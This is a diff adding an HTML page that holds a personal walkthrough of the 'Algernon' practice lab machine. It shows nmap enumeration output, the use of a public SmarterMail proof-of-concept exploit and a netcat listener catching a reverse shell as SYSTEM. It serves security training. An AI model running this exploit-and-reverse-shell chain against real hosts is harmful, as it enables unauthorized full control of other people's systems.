@@ -1,0 +1,90 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">PG Practice : Algernon</h1>
+    <p class="text">Difficulty : Easy | CommunityRating : Easy | MyRating : Easy | Cleartime : 17min</p>
+
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/algernon]
+└─$ sudo nmap -p- -sCV $IP --min-rate=10000          
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-18 23:00 EST
+Warning: 192.168.202.65 giving up on port because retransmission cap hit (10).
+Nmap scan report for 192.168.202.65
+Host is up (0.11s latency).
+Not shown: 64593 closed tcp ports (reset), 927 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+21/tcp    open  ftp           Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 04-29-20  09:31PM       &lt;DIR>          ImapRetrieval
+| 12-18-25  08:00PM       &lt;DIR>          Logs
+| 04-29-20  09:31PM       &lt;DIR>          PopRetrieval
+|_04-29-20  09:32PM       &lt;DIR>          Spool
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-title: IIS Windows
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+5040/tcp  open  unknown
+7680/tcp  open  pando-pub?
+9998/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+| uptime-agent-info: HTTP/1.1 400 Bad Request\x0D
+| Content-Type: text/html; charset=us-ascii\x0D
+| Server: Microsoft-HTTPAPI/2.0\x0D
+| Date: Fri, 19 Dec 2025 04:04:09 GMT\x0D
+| Connection: close\x0D
+| Content-Length: 326\x0D
+| \x0D
+| &lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">\x0D
+| &lt;HTML>&lt;HEAD>&lt;TITLE>Bad Request&lt;/TITLE>\x0D
+| &lt;META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii">&lt;/HEAD>\x0D
+| &lt;BODY>&lt;h2>Bad Request - Invalid Verb&lt;/h2>\x0D
+| &lt;hr>&lt;p>HTTP Error 400. The request verb is invalid.&lt;/p>\x0D
+|_&lt;/BODY>&lt;/HTML>\x0D
+| http-title: Site doesn't have a title (text/html; charset=utf-8).
+|_Requested resource was /interface/root
+|_http-server-header: Microsoft-IIS/10.0
+17001/tcp open  remoting      MS .NET Remoting services
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre></div>
+
+<p class="text">Several http ports are open on the target machine.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/algernon/1.png' %}" alt="">
+    <p class="text">Opening 9998, I found webapp SmarterMail. Searching its name, I found <a href="https://www.exploit-db.com/exploits/49216">this poc</a>.</p>
+</div>
+
+<p class="text">I removed all new line since they are non-readable for my kali machine, and changed HOST and LHOST parameters.</p>
+<p class="text">Then, launched poc file.</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/algernon]
+└─$ python3 exploit.py</code></pre></div>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/algernon]
+└─$ rlwrap nc -lvnp 4444                
+listening on [any] 4444 ...
+connect to [192.168.45.175] from (UNKNOWN) [192.168.202.65] 49898
+id
+PS C:\Windows\system32> whoami
+nt authority\system</code></pre></div>
+
+
+</body>
+</html>
